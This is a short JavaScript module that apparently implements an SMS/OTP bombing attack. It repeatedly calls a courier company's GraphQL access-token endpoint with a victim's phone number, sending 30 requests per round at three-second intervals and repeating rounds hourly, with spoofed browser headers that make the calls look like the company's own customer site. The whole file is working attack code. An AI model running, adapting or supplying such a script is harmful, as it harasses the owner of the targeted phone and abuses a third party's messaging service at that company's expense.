const axios = require("axios");

async function sundarban(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const response = await axios.post(
  'https://api-gateway.sundarbancourierltd.com/graphql',
  {
    'operationName': 'CreateAccessToken',
    'variables': {
      'accessTokenFilter': {
        'userName': number
      }
    },
    'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n      __typename\n    }\n    __typename\n  }\n}'
  },
  {
    headers: {
      'authority': 'api-gateway.sundarbancourierltd.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'authorization': '',
      'content-type': 'application/json',
      'origin': 'https://customer.sundarbancourierltd.com',
      'referer': 'https://customer.sundarbancourierltd.com/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        
        console.log(`[${i + 1}/10] Sundarban Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Sundarban Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { sundarban };
